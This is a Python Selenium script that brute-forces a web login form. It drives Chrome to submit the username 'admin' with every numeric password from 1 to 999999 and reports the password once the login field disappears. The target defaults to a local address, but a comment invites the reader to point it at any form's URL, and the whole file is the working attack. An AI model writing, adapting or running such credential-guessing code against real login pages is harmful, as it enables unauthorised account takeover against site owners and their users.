from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
import time

# Set up the driver and navigate to the form page
driver = webdriver.Chrome()
driver.get('http://127.0.0.1:5000')  # Replace with the URL of your form

# Optional: Maximize window
driver.maximize_window()

try:
    for password in range(1, 999999 + 1):
        try:
            # Find the username input field and enter the username
            username_field = driver.find_element(By.ID, 'username')
            username_field.clear()  # Clear the field before entering the username
            username_field.send_keys('admin')

            # Find the password input field and enter the current password
            password_field = driver.find_element(By.ID, 'password')
            password_field.clear()  # Clear the field before entering the password
            password_field.send_keys(str(password))

            # Submit the form
            password_field.send_keys(Keys.RETURN)

            # Wait a bit for any potential redirection
            time.sleep(0.001)

            # Check if login elements are still present, indicating failed login
            driver.find_element(By.ID, 'username')
        except NoSuchElementException:
            print(f"Login successful with password: {password}")
            break  # Exit the loop as login was successful

        # Optionally, navigate back to the login page if it redirects on failure
        # driver.get('http://127.0.0.1:5000')  # Uncomment and adjust URL as needed

except Exception as e:
    print(f"An error occurred: {e}")

# Add a pause at the end of the script
input("Press Enter to close the browser and end the script...")
